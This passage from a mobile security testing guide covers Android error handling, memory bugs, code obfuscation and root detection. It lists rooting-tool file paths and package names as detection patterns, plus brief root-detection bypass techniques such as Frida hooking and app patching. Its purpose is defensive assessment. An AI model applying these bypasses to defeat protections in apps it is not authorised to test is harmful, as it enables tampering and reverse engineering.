\KeywordTok{protected} \DataTypeTok{void} \FunctionTok{attachBaseContext}\NormalTok{(}\BuiltInTok{Context}\NormalTok{ base) \{}
    \KeywordTok{super}\NormalTok{.}\FunctionTok{attachBaseContext}\NormalTok{(base);}
\NormalTok{    MemoryCleanerOnCrash.}\FunctionTok{init}\NormalTok{();}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

\hypertarget{dynamic-analysis-44}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-44}}

There are several ways to do dynamic analysis:

\begin{itemize}
\tightlist
\item
  Use Xposed to hook into methods and either call them with unexpected
  values or overwrite existing variables with unexpected values (e.g.,
  null values).
\item
  Type unexpected values into the Android application's UI fields.
\item
  Interact with the application using its intents, its public providers,
  and unexpected values.
\item
  Tamper with the network communication and/or the files stored by the
  application.
\end{itemize}

The application should never crash; it should

\begin{itemize}
\tightlist
\item
  recover from the error or transition into a state in which it can
  inform the user of its inability to continue,
\item
  if necessary, tell the user to take appropriate action (The message
  should not leak sensitive information.),
\item
  not provide any information in logging mechanisms used by the
  application.
\end{itemize}

\hypertarget{memory-corruption-bugs-mstg-code-8-1}{%
\subsubsection{Memory Corruption Bugs
(MSTG-CODE-8)}\label{memory-corruption-bugs-mstg-code-8-1}}

Android applications often run on a VM where most of the memory
corruption issues have been taken care off. This does not mean that
there are no memory corruption bugs. Take
\href{https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9522}{CVE-2018-9522}
for instance, which is related to serialization issues using Parcels.
Next, in native code, we still see the same issues as we explained in
the general memory corruption section. Last, we see memory bugs in
supporting services, such as with the Stagefright attack as shown
\href{https://www.blackhat.com/docs/us-15/materials/us-15-Drake-Stagefright-Scary-Code-In-The-Heart-Of-Android.pdf}{at
BlackHat}.

A memory leak is often an issue as well. This can happen for instance
when a reference to the \texttt{Context} object is passed around to
non-\texttt{Activity} classes, or when you pass references to
\texttt{Activity} classes to your helper classes.

\hypertarget{static-analysis-48}{%
\paragraph{Static Analysis}\label{static-analysis-48}}

There are various items to look for:

\begin{itemize}
\tightlist
\item
  Are there native code parts? If so: check for the given issues in the
  general memory corruption section. Native code can easily be spotted
  given JNI-wrappers, .CPP/.H/.C files, NDK or other native frameworks.
\item
  Is there Java code or Kotlin code? Look for
  Serialization/deserialization issues, such as described in
  \href{https://securitylab.github.com/research/android-deserialization-vulnerabilities}{A
  brief history of Android deserialization vulnerabilities}.
\end{itemize}

Note that there can be Memory leaks in Java/Kotlin code as well. Look
for various items, such as: BroadcastReceivers which are not
unregistered, static references to \texttt{Activity} or \texttt{View}
classes, Singleton classes that have references to \texttt{Context},
Inner Class references, Anonymous Class references, AsyncTask
references, Handler references, Threading done wrong, TimerTask
references. For more details, please check:

\begin{itemize}
\tightlist
\item
  \href{https://android.jlelse.eu/9-ways-to-avoid-memory-leaks-in-android-b6d81648e35e}{9
  ways to avoid memory leaks in Android}
\item
  \href{https://android.jlelse.eu/memory-leak-patterns-in-android-4741a7fcb570}{Memory
  Leak Patterns in Android}.
\end{itemize}

\hypertarget{dynamic-analysis-45}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-45}}

There are various steps to take:

\begin{itemize}
\tightlist
\item
  In case of native code: use Valgrind or Mempatrol to analyze the
  memory usage and memory calls made by the code.
\item
  In case of Java/Kotlin code, try to recompile the app and use it with
  \href{https://github.com/square/leakcanary}{Squares leak canary}.
\item
  Check with the
  \href{https://developer.android.com/studio/profile/memory-profiler}{Memory
  Profiler from Android Studio} for leakage.
\item
  Check with the \href{https://github.com/modzero/modjoda}{Android Java
  Deserialization Vulnerability Tester}, for serialization
  vulnerabilities.
\end{itemize}

\hypertarget{make-sure-that-free-security-features-are-activated-mstg-code-9}{%
\subsubsection{Make Sure That Free Security Features Are Activated
(MSTG-CODE-9)}\label{make-sure-that-free-security-features-are-activated-mstg-code-9}}

\hypertarget{overview-40}{%
\paragraph{Overview}\label{overview-40}}

Because decompiling Java classes is trivial, applying some basic
obfuscation to the release byte-code is recommended. ProGuard offers an
easy way to shrink and obfuscate code and to strip unneeded debugging
information from the byte-code of Android Java apps. It replaces
identifiers, such as class names, method names, and variable names, with
meaningless character strings. This is a type of layout obfuscation,
which is ``free'' in that it doesn't impact the program's performance.

Since most Android applications are Java-based, they are
\href{https://owasp.org/www-community/vulnerabilities/Buffer_Overflow}{immune
to buffer overflow vulnerabilities}. Nevertheless, a buffer overflow
vulnerability may still be applicable when you're using the Android NDK;
therefore, consider secure compiler settings.

\hypertarget{static-analysis-49}{%
\paragraph{Static Analysis}\label{static-analysis-49}}

If source code is provided, you can check the build.gradle file to see
whether obfuscation settings have been applied. In the example below,
you can see that \texttt{minifyEnabled} and \texttt{proguardFiles} are
set. Creating exceptions to protect some classes from obfuscation (with
\texttt{-keepclassmembers} and \texttt{-keep\ class}) is common.
Therefore, auditing the ProGuard configuration file to see what classes
are exempted is important. The
\texttt{getDefaultProguardFile(\textquotesingle{}proguard-android.txt\textquotesingle{})}
method gets the default ProGuard settings from the
\texttt{\textless{}Android\ SDK\textgreater{}/tools/proguard/} folder.

Further information on how to shrink, obfuscate, and optimize your app
can be found in the
\href{https://developer.android.com/studio/build/shrink-code}{Android
developer documentation}.

\begin{quote}
When you build you project using Android Studio 3.4 or Android Gradle
plugin 3.4.0 or higher, the plugin no longer uses ProGuard to perform
compile-time code optimization. Instead, the plugin works with the R8
compiler. R8 works with all of your existing ProGuard rules files, so
updating the Android Gradle plugin to use R8 should not require you to
change your existing rules.
\end{quote}

R8 is the new code shrinker from Google and was introduced in Android
Studio 3.3 beta. By default, R8 removes attributes that are useful for
debugging, including line numbers, source file names, and variable
names. R8 is a free Java class file shrinker, optimizer, obfuscator, and
pre-verifier and is faster than ProGuard, see also an
\href{https://android-developers.googleblog.com/2018/11/r8-new-code-shrinker-from-google-is.html}{Android
Developer blog post for further details}. It is shipped with Android's
SDK tools. To activate shrinking for the release build, add the
following to build.gradle:

\begin{verbatim}
android {
    buildTypes {
        release {
            // Enables code shrinking, obfuscation, and optimization for only
            // your project's release build type.
            minifyEnabled true

            // Includes the default ProGuard rules files that are packaged with
            // the Android Gradle plugin. To learn more, go to the section about
            // R8 configuration files.
            proguardFiles getDefaultProguardFile(
                    'proguard-android-optimize.txt'),
                    'proguard-rules.pro'
        }
    }
    ...
}
\end{verbatim}

The file \texttt{proguard-rules.pro} is where you define custom ProGuard
rules. With the flag \texttt{-keep} you can keep certain code that is
not being removed by R8, which might otherwise produce errors. For
example to keep common Android classes, as in our sample configuration
\texttt{proguard-rules.pro} file:

\begin{verbatim}
...
-keep public class * extends android.app.Activity
-keep public class * extends android.app.Application
-keep public class * extends android.app.Service
...
\end{verbatim}

You can define this more granularly on specific classes or libraries in
your project with the
\href{https://developer.android.com/studio/build/shrink-code\#configuration-files}{following
syntax}:

\begin{verbatim}
-keep public class MyClass
\end{verbatim}

\hypertarget{dynamic-analysis-46}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-46}}

If source code has not been provided, an APK can be decompiled to
determine whether the codebase has been obfuscated. Several tools are
available for converting DEX code to a JAR file (e.g.~dex2jar). The JAR
file can be opened with tools such as JD-GUI that can be used to make
sure that class, method, and variable names are not human-readable.

Below you can find a sample for an obfuscated code block:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{package}\ImportTok{ com.a.a.a;}

\KeywordTok{import}\ImportTok{ com.a.a.b.a;}
\KeywordTok{import}\ImportTok{ java.util.List;}

\KeywordTok{class}\NormalTok{ a$b}
  \KeywordTok{extends}\NormalTok{ a}
\NormalTok{\{}
  \KeywordTok{public}\NormalTok{ a$}\FunctionTok{b}\NormalTok{(}\BuiltInTok{List}\NormalTok{ paramList)}
\NormalTok{  \{}
    \KeywordTok{super}\NormalTok{(paramList);}
\NormalTok{  \}}

  \KeywordTok{public} \DataTypeTok{boolean} \FunctionTok{areAllItemsEnabled}\NormalTok{()}
\NormalTok{  \{}
    \KeywordTok{return} \KeywordTok{true}\NormalTok{;}
\NormalTok{  \}}

  \KeywordTok{public} \DataTypeTok{boolean} \FunctionTok{isEnabled}\NormalTok{(}\DataTypeTok{int}\NormalTok{ paramInt)}
\NormalTok{  \{}
    \KeywordTok{return} \KeywordTok{true}\NormalTok{;}
\NormalTok{  \}}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

\hypertarget{references-14}{%
\subsubsection{References}\label{references-14}}

\hypertarget{owasp-masvs-11}{%
\paragraph{OWASP MASVS}\label{owasp-masvs-11}}

\begin{itemize}
\tightlist
\item
  MSTG-CODE-1: ``The app is signed and provisioned with a valid
  certificate, of which the private key is properly protected.''
\item
  MSTG-CODE-2: ``The app has been built in release mode, with settings
  appropriate for a release build (e.g.~non-debuggable).''
\item
  MSTG-CODE-3: ``Debugging symbols have been removed from native
  binaries.''
\item
  MSTG-CODE-4: ``Debugging code and developer assistance code (e.g.~test
  code, backdoors, hidden settings) have been removed. The app does not
  log verbose errors or debugging messages.''
\item
  MSTG-CODE-5: ``All third party components used by the mobile app, such
  as libraries and frameworks, are identified, and checked for known
  vulnerabilities.''
\item
  MSTG-CODE-6: ``The app catches and handles possible exceptions.''
\item
  MSTG-CODE-7: ``Error handling logic in security controls denies access
  by default.''
\item
  MSTG-CODE-8: ``In unmanaged code, memory is allocated, freed and used
  securely.''
\item
  MSTG-CODE-9: ``Free security features offered by the toolchain, such
  as byte-code minification, stack protection, PIE support and automatic
  reference counting, are activated.''
\end{itemize}

\hypertarget{tools-7}{%
\paragraph{Tools}\label{tools-7}}

\begin{itemize}
\tightlist
\item
  ProGuard - \url{https://www.guardsquare.com/en/proguard}
\item
  jarsigner -
  \url{http://docs.oracle.com/javase/7/docs/technotes/tools/windows/jarsigner.html}
\item
  Xposed - \url{http://repo.xposed.info/}
\item
  Drozer -
  \url{https://labs.mwrinfosecurity.com/assets/BlogFiles/mwri-drozer-user-guide-2015-03-23.pdf}
\item
  GNU nm -
  \url{https://ftp.gnu.org/old-gnu/Manuals/binutils-2.12/html_node/binutils_4.html}
\item
  Black Duck - \url{https://www.blackducksoftware.com/}
\item
  Sourceclear - \url{https://www.sourceclear.com/}
\item
  Snyk - \url{https://snyk.io/}
\item
  Gradle license plugn -
  \url{https://github.com/hierynomus/license-gradle-plugin}
\item
  Dependency-check-gradle -
  \url{https://github.com/jeremylong/dependency-check-gradle}
\item
  MobSF -
  \url{https://www.github.com/MobSF/Mobile-Security-Framework-MobSF}
\item
  Squares leak canary - \url{https://github.com/square/leakcanary}
\item
  Memory Profiler from Android Studio -
  \url{https://developer.android.com/studio/profile/memory-profiler}
\item
  Android Java Deserialization Vulnerability Tester -
  \url{https://github.com/modzero/modjoda}
\end{itemize}

\hypertarget{memory-analysis-references}{%
\paragraph{Memory Analysis
References}\label{memory-analysis-references}}

\begin{itemize}
\tightlist
\item
  A brief history of Android deserialization vulnerabilities -
  \url{https://securitylab.github.com/research/android-deserialization-vulnerabilities}
\item
  9 ways to avoid memory leaks in Android -
  \url{https://android.jlelse.eu/9-ways-to-avoid-memory-leaks-in-android-b6d81648e35e}
\item
  Memory Leak Patterns in Android -
  \url{https://android.jlelse.eu/memory-leak-patterns-in-android-4741a7fcb570}
\end{itemize}

\hypertarget{android-documentation}{%
\paragraph{Android Documentation}\label{android-documentation}}

\begin{itemize}
\tightlist
\item
  APK signature scheme with key rotation -
  \url{https://developer.android.com/about/versions/pie/android-9.0\#apk-key-rotation}
\end{itemize}

\hypertarget{android-anti-reversing-defenses}{%
\subsection{Android Anti-Reversing
Defenses}\label{android-anti-reversing-defenses}}

\hypertarget{testing-root-detection-mstg-resilience-1}{%
\subsubsection{Testing Root Detection
(MSTG-RESILIENCE-1)}\label{testing-root-detection-mstg-resilience-1}}

\hypertarget{overview-41}{%
\paragraph{Overview}\label{overview-41}}

In the context of anti-reversing, the goal of root detection is to make
running the app on a rooted device a bit more difficult, which in turn
blocks some of the tools and techniques reverse engineers like to use.
Like most other defenses, root detection is not very effective by
itself, but implementing multiple root checks that are scattered
throughout the app can improve the effectiveness of the overall
anti-tampering scheme.

For Android, we define ``root detection'' a bit more broadly, including
custom ROMs detection, i.e., determining whether the device is a stock
Android build or a custom build.

\hypertarget{common-root-detection-methods}{%
\paragraph{Common Root Detection
Methods}\label{common-root-detection-methods}}

In the following section, we list some common root detection methods
you'll encounter. You'll find some of these methods implemented in the
\href{https://github.com/OWASP/owasp-mstg/tree/master/Crackmes}{crackme
examples} that accompany the OWASP Mobile Testing Guide.

Root detection can also be implemented through libraries such as
\href{https://github.com/scottyab/rootbeer}{RootBeer}.

\hypertarget{safetynet}{%
\subparagraph{SafetyNet}\label{safetynet}}

SafetyNet is an Android API that provides a set of services and creates
profiles of devices according to software and hardware information. This
profile is then compared to a list of whitelisted device models that
have passed Android compatibility testing. Google
\href{https://developers.google.com/android/reference/com/google/android/gms/safetynet/SafetyNet}{recommends}
using the feature as ``an additional in-depth defense signal as part of
an anti-abuse system''.

How exactly SafetyNet works is not well documented and may change at any
time. When you call this API, SafetyNet downloads a binary package
containing the device validation code provided from Google, and the code
is then dynamically executed via reflection. An
\href{https://koz.io/inside-safetynet/}{analysis by John Kozyrakis}
showed that SafetyNet also attempts to detect whether the device is
rooted, but exactly how that's determined is unclear.

To use the API, an app may call the \texttt{SafetyNetApi.attest} method
(which returns a JWS message with the \emph{Attestation Result}) and
then check the following fields:

\begin{itemize}
\tightlist
\item
  \texttt{ctsProfileMatch}: If `true', the device profile matches one of
  Google's listed devices.
\item
  \texttt{basicIntegrity}: If `true', the device running the app likely
  hasn't been tampered with.
\item
  \texttt{nonces}: To match the response to its request.
\item
  \texttt{timestampMs}: To check how much time has passed since you made
  the request and you got the response. A delayed response may suggest
  suspicious activity.
\item
  \texttt{apkPackageName}, \texttt{apkCertificateDigestSha256},
  \texttt{apkDigestSha256}: Provide information about the APK, which is
  used to verify the identity of the calling app. These parameters are
  absent if the API cannot reliably determine the APK information.
\end{itemize}

The following is a sample attestation result:

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{\{}
  \DataTypeTok{"nonce"}\FunctionTok{:} \StringTok{"R2Rra24fVm5xa2Mg"}\FunctionTok{,}
  \DataTypeTok{"timestampMs"}\FunctionTok{:} \DecValTok{9860437986543}\FunctionTok{,}
  \DataTypeTok{"apkPackageName"}\FunctionTok{:} \StringTok{"com.package.name.of.requesting.app"}\FunctionTok{,}
  \DataTypeTok{"apkCertificateDigestSha256"}\FunctionTok{:} \OtherTok{[}\StringTok{"base64 encoded, SHA{-}256 hash of the}
\StringTok{                                  certificate used to sign requesting app"}\OtherTok{]}\FunctionTok{,}
  \DataTypeTok{"apkDigestSha256"}\FunctionTok{:} \StringTok{"base64 encoded, SHA{-}256 hash of the app\textquotesingle{}s APK"}\FunctionTok{,}
  \DataTypeTok{"ctsProfileMatch"}\FunctionTok{:} \KeywordTok{true}\FunctionTok{,}
  \DataTypeTok{"basicIntegrity"}\FunctionTok{:} \KeywordTok{true}\FunctionTok{,}
\FunctionTok{\}}
\end{Highlighting}
\end{Shaded}

ctsProfileMatch Vs basicIntegrity

The SafetyNet Attestation API initially provided a single value called
\texttt{basicIntegrity} to help developers determine the integrity of a
device. As the API evolved, Google introduced a new, stricter check
whose results appear in a value called \texttt{ctsProfileMatch}, which
allows developers to more finely evaluate the devices on which their app
is running.

In broad terms, \texttt{basicIntegrity} gives you a signal about the
general integrity of the device and its API. Many Rooted devices fail
\texttt{basicIntegrity}, as do emulators, virtual devices, and devices
with signs of tampering, such as API hooks.

On the other hand, \texttt{ctsProfileMatch} gives you a much stricter
signal about the compatibility of the device. Only unmodified devices
that have been certified by Google can pass \texttt{ctsProfileMatch}.
Devices that will fail \texttt{ctsProfileMatch} include the following:

\begin{itemize}
\tightlist
\item
  Devices that fail \texttt{basicIntegrity}
\item
  Devices with an unlocked bootloader
\item
  Devices with a custom system image (custom ROM)
\item
  Devices for which the manufacturer didn't apply for, or pass, Google
  certification
\item
  Devices with a system image built directly from the Android Open
  Source Program source files
\item
  Devices with a system image distributed as part of a beta or developer
  preview program (including the Android Beta Program)
\end{itemize}

Recommendations when using \texttt{SafetyNetApi.attest}

\begin{itemize}
\tightlist
\item
  Create a large (16 bytes or longer) random number on your server using
  a cryptographically-secure random function so that a malicious user
  can not reuse a successful attestation result in place of an
  unsuccessful result
\item
  Trust APK information (\texttt{apkPackageName},
  \texttt{apkCertificateDigestSha256} and \texttt{apkDigestSha256}) only
  if the value of \texttt{ctsProfileMatch} is true.
\item
  The entire JWS response should be sent to your server, using a secure
  connection, for verification. It isn't recommended to perform the
  verification directly in the app because, in that case, there is no
  guarantee that the verification logic itself hasn't been modified.
\item
  The \texttt{verify} method only validates that the JWS message was
  signed by SafetyNet. It doesn't verify that the payload of the verdict
  matches your expectations. As useful as this service may seem, it is
  designed for test purposes only, and it has very strict usage quotas
  of 10,000 requests per day, per project which will not be increased
  upon request. Hence, you should refer
  \href{https://github.com/googlesamples/android-play-safetynet/tree/master/server/java/src/main/java}{SafetyNet
  Verification Samples} and implement the digital signature verification
  logic on your server in a way that it doesn't depend on Google's
  servers.
\item
  The SafetyNet Attestation API gives you a snapshot of the state of a
  device at the moment when the attestation request was made. A
  successful attestation doesn't necessarily mean that the device would
  have passed attestation in the past, or that it will in the future.
  It's recommended to plan a strategy to use the least amount of
  attestations required to satisfy the use case.
\item
  To prevent inadvertently reaching your \texttt{SafetyNetApi.attest}
  quota and getting attestation errors, you should build a system that
  monitors your usage of the API and warns you well before you reach
  your quota so you can get it increased. You should also be prepared to
  handle attestation failures because of an exceeded quota and avoid
  blocking all your users in this situation. If you are close to
  reaching your quota, or expect a short-term spike that may lead you to
  exceed your quota, you can submit this
  \href{https://support.google.com/googleplay/android-developer/contact/safetynetqr}{form}
  to request short or long-term increases to the quota for your API key.
  This process, as well as the additional quota, is free of charge.
\end{itemize}

Follow this
\href{https://developer.android.com/training/safetynet/attestation-checklist}{checklist}
to ensure that you've completed each of the steps needed to integrate
the \texttt{SafetyNetApi.attest} API into the app.

\hypertarget{programmatic-detection}{%
\subparagraph{Programmatic Detection}\label{programmatic-detection}}

File existence checks

Perhaps the most widely used method of programmatic detection is
checking for files typically found on rooted devices, such as package
files of common rooting apps and their associated files and directories,
including the following:

\begin{verbatim}
/system/app/Superuser.apk
/system/etc/init.d/99SuperSUDaemon
/dev/com.koushikdutta.superuser.daemon/
/system/xbin/daemonsu
\end{verbatim}

Detection code also often looks for binaries that are usually installed
once a device has been rooted. These searches include checking for
busybox and attempting to open the \emph{su} binary at different
locations:

\begin{verbatim}
/sbin/su  
/system/bin/su  
/system/bin/failsafe/su  
/system/xbin/su  
/system/xbin/busybox  
/system/sd/xbin/su  
/data/local/su  
/data/local/xbin/su  
/data/local/bin/su  
\end{verbatim}

Checking whether \texttt{su} is on the PATH also works:

\begin{Shaded}
\begin{Highlighting}[]
    \KeywordTok{public} \DataTypeTok{static} \DataTypeTok{boolean} \FunctionTok{checkRoot}\NormalTok{()\{}
        \KeywordTok{for}\NormalTok{(}\BuiltInTok{String}\NormalTok{ pathDir : }\BuiltInTok{System}\NormalTok{.}\FunctionTok{getenv}\NormalTok{(}\StringTok{"PATH"}\NormalTok{).}\FunctionTok{split}\NormalTok{(}\StringTok{":"}\NormalTok{))\{}
            \KeywordTok{if}\NormalTok{(}\KeywordTok{new} \BuiltInTok{File}\NormalTok{(pathDir, }\StringTok{"su"}\NormalTok{).}\FunctionTok{exists}\NormalTok{()) \{}
                \KeywordTok{return} \KeywordTok{true}\NormalTok{;}
\NormalTok{            \}}
\NormalTok{        \}}
        \KeywordTok{return} \KeywordTok{false}\NormalTok{;}
\NormalTok{    \}}
\end{Highlighting}
\end{Shaded}

File checks can be easily implemented in both Java and native code. The
following JNI example (adapted from
\href{https://github.com/devadvance/rootinspector/}{rootinspector}) uses
the \texttt{stat} system call to retrieve information about a file and
returns ``1'' if the file exists.

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{jboolean Java\_com\_example\_statfile(JNIEnv * env, jobject this, jstring filepath) \{}
\NormalTok{  jboolean fileExists = }\DecValTok{0}\NormalTok{;}
\NormalTok{  jboolean isCopy;}
  \DataTypeTok{const} \DataTypeTok{char}\NormalTok{ * path = (*env){-}>GetStringUTFChars(env, filepath, \&isCopy);}
  \KeywordTok{struct}\NormalTok{ stat fileattrib;}
  \ControlFlowTok{if}\NormalTok{ (stat(path, \&fileattrib) < }\DecValTok{0}\NormalTok{) \{}
\NormalTok{    \_\_android\_log\_print(ANDROID\_LOG\_DEBUG, DEBUG\_TAG, }\StringTok{"NATIVE: stat error: [\%s]"}\NormalTok{, strerror(errno));}
\NormalTok{  \} }\ControlFlowTok{else}
\NormalTok{  \{}
\NormalTok{    \_\_android\_log\_print(ANDROID\_LOG\_DEBUG, DEBUG\_TAG, }\StringTok{"NATIVE: stat success, access perms: [\%d]"}\NormalTok{, fileattrib.st\_mode);}
    \ControlFlowTok{return} \DecValTok{1}\NormalTok{;}
\NormalTok{  \}}

  \ControlFlowTok{return} \DecValTok{0}\NormalTok{;}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

Executing \texttt{su} and other commands

Another way of determining whether \texttt{su} exists is attempting to
execute it through the \texttt{Runtime.getRuntime.exec} method. An
IOException will be thrown if \texttt{su} is not on the PATH. The same
method can be used to check for other programs often found on rooted
devices, such as busybox and the symbolic links that typically point to
it.

Checking running processes

Supersu-by far the most popular rooting tool-runs an authentication
daemon named \texttt{daemonsu}, so the presence of this process is
another sign of a rooted device. Running processes can be enumerated
with the \texttt{ActivityManager.getRunningAppProcesses} and
\texttt{manager.getRunningServices} APIs, the \texttt{ps} command, and
browsing through the \texttt{/proc} directory. The following is an
example implemented in
\href{https://github.com/devadvance/rootinspector/}{rootinspector}:

\begin{Shaded}
\begin{Highlighting}[]
    \KeywordTok{public} \DataTypeTok{boolean} \FunctionTok{checkRunningProcesses}\NormalTok{() \{}

      \DataTypeTok{boolean}\NormalTok{ returnValue = }\KeywordTok{false}\NormalTok{;}

      \CommentTok{// Get currently running application processes}
      \BuiltInTok{List}\NormalTok{<RunningServiceInfo> list = manager.}\FunctionTok{getRunningServices}\NormalTok{(}\DecValTok{300}\NormalTok{);}

      \KeywordTok{if}\NormalTok{(list != }\KeywordTok{null}\NormalTok{)\{}
        \BuiltInTok{String}\NormalTok{ tempName;}
        \KeywordTok{for}\NormalTok{(}\DataTypeTok{int}\NormalTok{ i=}\DecValTok{0}\NormalTok{;i<list.}\FunctionTok{size}\NormalTok{();++i)\{}
\NormalTok{          tempName = list.}\FunctionTok{get}\NormalTok{(i).}\FunctionTok{process}\NormalTok{;}

          \KeywordTok{if}\NormalTok{(tempName.}\FunctionTok{contains}\NormalTok{(}\StringTok{"supersu"}\NormalTok{) || tempName.}\FunctionTok{contains}\NormalTok{(}\StringTok{"superuser"}\NormalTok{))\{}
\NormalTok{            returnValue = }\KeywordTok{true}\NormalTok{;}
\NormalTok{          \}}
\NormalTok{        \}}
\NormalTok{      \}}
      \KeywordTok{return}\NormalTok{ returnValue;}
\NormalTok{    \}}
\end{Highlighting}
\end{Shaded}

Checking installed app packages

You can use the Android package manager to obtain a list of installed
packages. The following package names belong to popular rooting tools:

\begin{verbatim}
com.thirdparty.superuser
eu.chainfire.supersu
com.noshufou.android.su
com.koushikdutta.superuser
com.zachspong.temprootremovejb
com.ramdroid.appquarantine
com.topjohnwu.magisk
\end{verbatim}

Checking for writable partitions and system directories

Unusual permissions on system directories may indicate a customized or
rooted device. Although the system and data directories are normally
mounted read-only, you'll sometimes find them mounted read-write when
the device is rooted. Look for these filesystems mounted with the ``rw''
flag or try to create a file in the data directories.

Checking for custom Android builds

Checking for signs of test builds and custom ROMs is also helpful. One
way to do this is to check the BUILD tag for test-keys, which normally
\href{https://resources.infosecinstitute.com/android-hacking-security-part-8-root-detection-evasion//}{indicate
a custom Android image}.
\href{https://www.joeyconway.com/blog/2014/03/29/android-detect-root-access-from-inside-an-app/}{Check
the BUILD tag as follows}:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{private} \DataTypeTok{boolean} \FunctionTok{isTestKeyBuild}\NormalTok{()}
\NormalTok{\{}
\BuiltInTok{String}\NormalTok{ str = Build.}\FunctionTok{TAGS}\NormalTok{;}
\KeywordTok{if}\NormalTok{ ((str != }\KeywordTok{null}\NormalTok{) \&\& (str.}\FunctionTok{contains}\NormalTok{(}\StringTok{"test{-}keys"}\NormalTok{)));}
\KeywordTok{for}\NormalTok{ (}\DataTypeTok{int}\NormalTok{ i = }\DecValTok{1}\NormalTok{; ; i = }\DecValTok{0}\NormalTok{)}
  \KeywordTok{return}\NormalTok{ i;}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

Missing Google Over-The-Air (OTA) certificates is another sign of a
custom ROM: on stock Android builds,
\href{https://blog.netspi.com/android-root-detection-techniques/}{OTA
updates Google's public certificates}.

\hypertarget{bypassing-root-detection}{%
\subparagraph{Bypassing Root Detection}\label{bypassing-root-detection}}

Run execution traces with jdb, DDMS, \texttt{strace}, and/or kernel
modules to find out what the app is doing. You'll usually see all kinds
of suspect interactions with the operating system, such as opening
\texttt{su} for reading and obtaining a list of processes. These
interactions are surefire signs of root detection. Identify and
deactivate the root detection mechanisms, one at a time. If you're
performing a black box resilience assessment, disabling the root
detection mechanisms is your first step.

To bypass these checks, you can use several techniques, most of which
were introduced in the ``Reverse Engineering and Tampering'' chapter:

\begin{itemize}
\tightlist
\item
  Renaming binaries. For example, in some cases simply renaming the
  \texttt{su} binary is enough to defeat root detection (try not to
  break your environment though!).
\item
  Unmounting \texttt{/proc} to prevent reading of process lists.
  Sometimes, the unavailability of \texttt{/proc} is enough to bypass
  such checks.
\item
  Using Frida or Xposed to hook APIs on the Java and native layers. This
  hides files and processes, hides the contents of files, and returns
  all kinds of bogus values that the app requests.
\item
  Hooking low-level APIs by using kernel modules.
\item
  Patching the app to remove the checks.
\end{itemize}

\hypertarget{effectiveness-assessment}{%
\paragraph{Effectiveness Assessment}\label{effectiveness-assessment}}

Check for root detection mechanisms, including the following criteria:

\begin{itemize}
\tightlist
\item
  Multiple detection methods are scattered throughout the app (as
  opposed to putting everything into a single method).
\item
  The root detection mechanisms operate on multiple API layers (Java
  APIs, native library functions, assembler/system calls).
\item
  The mechanisms are somehow original (they're not copied and pasted
  from StackOverflow or other sources).
\end{itemize}

Develop bypass methods for the root detection mechanisms and answer the
following questions:

\begin{itemize}
\tightlist
\item
  Can the mechanisms be easily bypassed with standard tools, such as
  RootCloak?
\item
  Is static/dynamic analysis necessary to handle the root detection?
\item
  Do you need to write custom code?
\item
  How long did successfully bypassing the mechanisms take?
\item
  What is your assessment of the difficulty of bypassing the mechanisms?
\end{itemize}

If root detection is missing or too easily bypassed, make suggestions in
line with the effectiveness criteria listed above. These suggestions may
include more detection mechanisms and better integration of existing
mechanisms with other defenses.

\hypertarget{testing-anti-debugging-detection-mstg-resilience-2}{%
\subsubsection{Testing Anti-Debugging Detection
(MSTG-RESILIENCE-2)}\label{testing-anti-debugging-detection-mstg-resilience-2}}

\hypertarget{overview-42}{%
\paragraph{Overview}\label{overview-42}}

Debugging is a highly effective way to analyze runtime app behavior. It
allows the reverse engineer to step through the code, stop app execution
at arbitrary points, inspect the state of variables, read and modify
memory, and a lot more.

Anti-debugging features can be preventive or reactive. As the name
implies, preventive anti-debugging prevents the debugger from attaching
in the first place; reactive anti-debugging involves detecting debuggers
and reacting to them in some way (e.g., terminating the app or
triggering hidden behavior). The ``more-is-better'' rule applies: to
maximize effectiveness, defenders combine multiple methods of prevention
and detection that operate on different API layers and are well
distributed throughout the app.

As mentioned in the ``Reverse Engineering and Tampering'' chapter, we
have to deal with two debugging protocols on Android: we can debug on
the Java level with JDWP or on the native layer via a ptrace-based
debugger. A good anti-debugging scheme should defend against both types
of debugging.

\hypertarget{jdwp-anti-debugging}{%
\paragraph{JDWP Anti-Debugging}\label{jdwp-anti-debugging}}

In the chapter ``Reverse Engineering and Tampering'', we talked about
JDWP, the protocol used for communication between the debugger and the
Java Virtual Machine. We showed that it is easy to enable debugging for
any app by patching its manifest file, and changing the
\texttt{ro.debuggable} system property which enables debugging for all
apps. Let's look at a few things developers do to detect and disable
JDWP debuggers.

\hypertarget{checking-the-debuggable-flag-in-applicationinfo}{%
\subparagraph{Checking the Debuggable Flag in
ApplicationInfo}\label{checking-the-debuggable-flag-in-applicationinfo}}

We have already encountered the \texttt{android:debuggable} attribute.
This flag in the Android Manifest determines whether the JDWP thread is
started for the app. Its value can be determined programmatically, via
the app's \texttt{ApplicationInfo} object. If the flag is set, the
manifest has been tampered with and allows debugging.

\begin{Shaded}
\begin{Highlighting}[]
    \KeywordTok{public} \DataTypeTok{static} \DataTypeTok{boolean} \FunctionTok{isDebuggable}\NormalTok{(}\BuiltInTok{Context}\NormalTok{ context)\{}

        \KeywordTok{return}\NormalTok{ ((context.}\FunctionTok{getApplicationContext}\NormalTok{().}\FunctionTok{getApplicationInfo}\NormalTok{().}\FunctionTok{flags}\NormalTok{ \& ApplicationInfo.}\FunctionTok{FLAG\_DEBUGGABLE}\NormalTok{) != }\DecValTok{0}\NormalTok{);}

\NormalTok{    \}}
\end{Highlighting}
\end{Shaded}

\hypertarget{isdebuggerconnected}{%
\subparagraph{isDebuggerConnected}\label{isdebuggerconnected}}

While this might be pretty obvious to circumvent for a reverse engineer,
you can use \texttt{isDebuggerConnected} from the
\texttt{android.os.Debug} class to determine whether a debugger is
connected.

\begin{Shaded}
\begin{Highlighting}[]
    \KeywordTok{public} \DataTypeTok{static} \DataTypeTok{boolean} \FunctionTok{detectDebugger}\NormalTok{() \{}
